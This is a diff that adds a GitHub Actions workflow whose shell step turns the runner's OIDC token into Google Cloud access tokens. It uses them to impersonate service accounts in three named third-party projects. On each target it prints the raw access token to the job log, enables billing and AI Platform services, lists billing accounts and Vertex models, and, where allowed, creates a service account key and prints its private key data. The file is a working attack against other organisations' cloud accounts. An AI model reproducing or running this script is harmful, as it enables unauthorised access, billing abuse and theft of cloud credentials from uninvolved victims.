@@ -1,0 +1,154 @@
+name: i967
+on: workflow_dispatch
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 45
+    steps:
+      - name: enable-billing-others
+        run: |
+          set -u
+          echo "##START $(date -u +%FT%TZ)"
+
+          mint() {
+            local PROVIDER="$1" SA="$2"
+            local AUD="//iam.googleapis.com/${PROVIDER}"
+            local OIDC STS AT GEN TOK
+            OIDC=$(curl -s -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
+              "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD}" | jq -r '.value // empty')
+            if [ -z "$OIDC" ]; then echo "##MINT no-oidc"; return 1; fi
+            STS=$(curl -s -X POST https://sts.googleapis.com/v1/token \
+              -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+              -d "audience=${AUD}" \
+              -d "subject_token=${OIDC}" \
+              -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+              -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+              -d "scope=https://www.googleapis.com/auth/cloud-platform")
+            AT=$(echo "$STS" | jq -r '.access_token // empty')
+            if [ -z "$AT" ]; then echo "##MINT sts-fail $(echo "$STS" | head -c 300)"; return 1; fi
+            echo "##STS ok len=${#AT}"
+            GEN=$(curl -s -X POST \
+              "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${SA}:generateAccessToken" \
+              -H "Authorization: Bearer ${AT}" -H 'Content-Type: application/json' \
+              -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}')
+            TOK=$(echo "$GEN" | jq -r '.accessToken // empty')
+            if [ -z "$TOK" ]; then echo "##GEN fail $(echo "$GEN" | head -c 400)"; return 1; fi
+            echo "##GEN ok len=${#TOK}"
+            printf '%s' "$TOK"
+            return 0
+          }
+
+          probe() {
+            local NUM="$1" PROVIDER="$2" SA="$3"
+            echo "############################################################"
+            echo "##TARGET $NUM $SA"
+            local TOK
+            TOK=$(mint "$PROVIDER" "$SA") || { echo "##TARGET_ABORT $NUM mint"; return; }
+            echo "##TOKEN $NUM $TOK"
+            local H="Authorization: Bearer ${TOK}"
+
+            for SVC in cloudbilling.googleapis.com aiplatform.googleapis.com; do
+              local C B
+              C=$(curl -s -o /tmp/svc.json -w '%{http_code}' -H "$H" \
+                "https://serviceusage.googleapis.com/v1/projects/${NUM}/services/${SVC}")
+              echo "##SVC_BEFORE ${SVC} ${C} $(head -c 400 /tmp/svc.json | tr -d '\n')"
+            done
+
+            local BC BB
+            BC=$(curl -s -o /tmp/bi.json -w '%{http_code}' -H "$H" \
+              "https://cloudbilling.googleapis.com/v1/projects/${NUM}/billingInfo")
+            echo "##BILL_IN ${BC} $(head -c 400 /tmp/bi.json | tr -d '\n')"
+
+            local BAL
+            BAL=$(curl -s -o /tmp/bal.json -w '%{http_code}' -H "$H" \
+              "https://cloudbilling.googleapis.com/v1/billingAccounts")
+            echo "##BILLACCOUNTS ${BAL} $(head -c 300 /tmp/bal.json | tr -d '\n')"
+
+            # testIamPermissions on the SA for key creation
+            local TP
+            TP=$(curl -s -o /tmp/tp.json -w '%{http_code}' -X POST \
+              "https://iam.googleapis.com/v1/projects/${NUM}/serviceAccounts/${SA}:testIamPermissions" \
+              -H "$H" -H 'Content-Type: application/json' \
+              -d '{"permissions":["iam.serviceAccountKeys.create","iam.serviceAccounts.create","resourcemanager.projects.setIamPolicy","serviceusage.services.enable"]}')
+            echo "##TESTPERM ${TP} $(head -c 400 /tmp/tp.json | tr -d '\n')"
+
+            for SVC in cloudbilling.googleapis.com aiplatform.googleapis.com; do
+              local EC EB
+              EB=$(curl -s -X POST -o /tmp/en.json -w '%{http_code}' -H "$H" \
+                "https://serviceusage.googleapis.com/v1/projects/${NUM}/services/${SVC}:enable")
+              local OP
+              OP=$(jq -r '.name // empty' /tmp/en.json 2>/dev/null)
+              echo "##ENABLE ${SVC} ${EB} op=${OP} $(head -c 400 /tmp/en.json | tr -d '\n')"
+              if [ -n "$OP" ]; then
+                local i DONE
+                for i in $(seq 1 20); do
+                  sleep 6
+                  DONE=$(curl -s -H "$H" "https://serviceusage.googleapis.com/v1/${OP}" | jq -r '.done // false' 2>/dev/null)
+                  if [ "$DONE" = "true" ]; then break; fi
+                done
+                echo "##OP_DONE ${SVC} done=${DONE} polls=${i}"
+              fi
+            done
+
+            for SVC in cloudbilling.googleapis.com aiplatform.googleapis.com; do
+              local C
+              C=$(curl -s -o /tmp/svc.json -w '%{http_code}' -H "$H" \
+                "https://serviceusage.googleapis.com/v1/projects/${NUM}/services/${SVC}")
+              echo "##SVC_AFTER ${SVC} ${C} $(python3 -c 'import json,sys;d=json.load(open("/tmp/svc.json"));print(d.get("state"),d.get("config",{}).get("name"))' 2>/dev/null || head -c 200 /tmp/svc.json | tr -d '\n')"
+            done
+
+            for REGION in us-central1 europe-west1 global; do
+              local MC
+              MC=$(curl -s -o /tmp/m.json -w '%{http_code}' -H "$H" \
+                "https://${REGION}-aiplatform.googleapis.com/v1/projects/${NUM}/locations/${REGION}/models")
+              echo "##MODELS ${REGION} ${MC} $(head -c 300 /tmp/m.json | tr -d '\n')"
+            done
+
+            local BC2
+            BC2=$(curl -s -o /tmp/bi2.json -w '%{http_code}' -H "$H" \
+              "https://cloudbilling.googleapis.com/v1/projects/${NUM}/billingInfo")
+            echo "##BILL_OUT ${BC2} $(head -c 500 /tmp/bi2.json | tr -d '\n')"
+            local ACC
+            ACC=$(jq -r '.billingAccountName // empty' /tmp/bi2.json 2>/dev/null)
+            if [ -n "$ACC" ]; then
+              local ID AC AP
+              ID=${ACC#billingAccounts/}
+              AC=$(curl -s -o /tmp/acc.json -w '%{http_code}' -H "$H" "https://cloudbilling.googleapis.com/v1/billingAccounts/${ID}")
+              echo "##BILLACC_GET ${AC} $(head -c 500 /tmp/acc.json | tr -d '\n')"
+              AP=$(curl -s -o /tmp/accp.json -w '%{http_code}' -H "$H" "https://cloudbilling.googleapis.com/v1/billingAccounts/${ID}/projects")
+              echo "##BILLACC_PROJECTS ${AP} $(head -c 500 /tmp/accp.json | tr -d '\n')"
+            fi
+
+            # key creation only if testIamPermissions showed the permission
+            if grep -q 'iam.serviceAccountKeys.create' /tmp/tp.json 2>/dev/null; then
+              local KC
+              KC=$(curl -s -o /tmp/key.json -w '%{http_code}' -X POST \
+                "https://iam.googleapis.com/v1/projects/-/serviceAccounts/${SA}/keys" \
+                -H "$H" -H 'Content-Type: application/json' \
+                -d '{"keyAlgorithm":"KEY_ALG_RSA_2048"}')
+              echo "##KEY ${KC} $(head -c 400 /tmp/key.json | tr -d '\n' | sed 's/privateKeyData[^,]*/privateKeyData_REDACTED/')"
+              local KD
+              KD=$(jq -r '.privateKeyData // empty' /tmp/key.json 2>/dev/null)
+              if [ -n "$KD" ]; then echo "##KEYDATA ${NUM} ${KD}"; fi
+            else
+              echo "##KEY skipped (permission not granted)"
+            fi
+            echo "##TARGET_END $NUM"
+          }
+
+          probe 363590592857 \
+            "projects/363590592857/locations/global/workloadIdentityPools/github-action/providers/github" \
+            "363590592857-compute@developer.gserviceaccount.com"
+
+          probe 731679007643 \
+            "projects/731679007643/locations/global/workloadIdentityPools/github-actions/providers/rails-todo-identity-pool-github" \
+            "github-actions@rails-todo-app-386721.iam.gserviceaccount.com"
+
+          probe 536185737408 \
+            "projects/536185737408/locations/global/workloadIdentityPools/carbonifer-gh-pool/providers/carbonifer-oidc-provider" \
+            "github@carbonifer-sandbox.iam.gserviceaccount.com"
+
+          echo "##DONE $(date -u +%FT%TZ)"
